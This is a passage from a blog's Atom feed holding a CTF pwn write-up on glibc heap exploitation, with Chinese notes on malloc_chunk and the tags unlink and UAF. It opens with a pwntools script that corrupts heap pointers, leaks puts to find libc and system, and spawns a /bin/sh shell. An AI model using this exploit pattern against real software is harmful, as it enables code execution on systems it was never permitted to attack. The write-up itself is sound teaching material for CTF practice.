class="line">add(<span class="number">0</span>,<span class="number">16</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">16</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(note-<span class="number">0x18</span>)+p64(puts))</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">'\x0a\x77\x65'</span>,drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">"puts"</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line">add(<span class="number">6</span>,<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">b"/bin/sh"</span>)</span><br><span class="line">p.sendline(<span class="string">b"6"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b"give me a hook\n"</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;堆的内部结构&quot;&gt;堆的内部结构&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;在程序的执行过程中，我们称由 malloc 申请的内存为 &lt;code&gt;chunk&lt;/code&gt;
。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;  This struct declaration is misleading (but accurate and necessary).&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;  It declares a &quot;view&quot; into memory allowing access to necessary&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;  fields at known offsets from a given base. See explanation below.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;malloc_chunk&lt;/span&gt; {&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  INTERNAL_SIZE_T      prev_size;  &lt;span class=&quot;comment&quot;&gt;/* Size of previous chunk (if free).  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  INTERNAL_SIZE_T      size;       &lt;span class=&quot;comment&quot;&gt;/* Size in bytes, including overhead. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;malloc_chunk&lt;/span&gt;* fd;         &lt;span class=&quot;comment&quot;&gt;/* double links -- used only if free. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;malloc_chunk&lt;/span&gt;* bk;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;/* Only used for large blocks: pointer to next larger size.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;malloc_chunk&lt;/span&gt;* fd_nextsize; &lt;span class=&quot;comment&quot;&gt;/* double links -- used only if free. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;malloc_chunk&lt;/span&gt;* bk_nextsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;};&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;关于堆的结构很重要的一点在于，其使用和 free
状态下的结构一致，只是相应功能有区别。例如使用时 fd
段用于存储数据，可以通过某些方法把不合法的数据写入一个 free chunk 的 fd
中。</summary>
    
    
    
    <category term="CTF" scheme="http://summ2.link/categories/CTF/"/>
    
    
    <category term="pwn" scheme="http://summ2.link/tags/pwn/"/>
    
    <category term="heap" scheme="http://summ2.link/tags/heap/"/>
    
    <category term="unlink" scheme="http://summ2.link/tags/unlink/"/>
    
    <category term="UAF" scheme="http://summ2.link/tags/UAF/"/>
    
  </entry>
  
</feed>
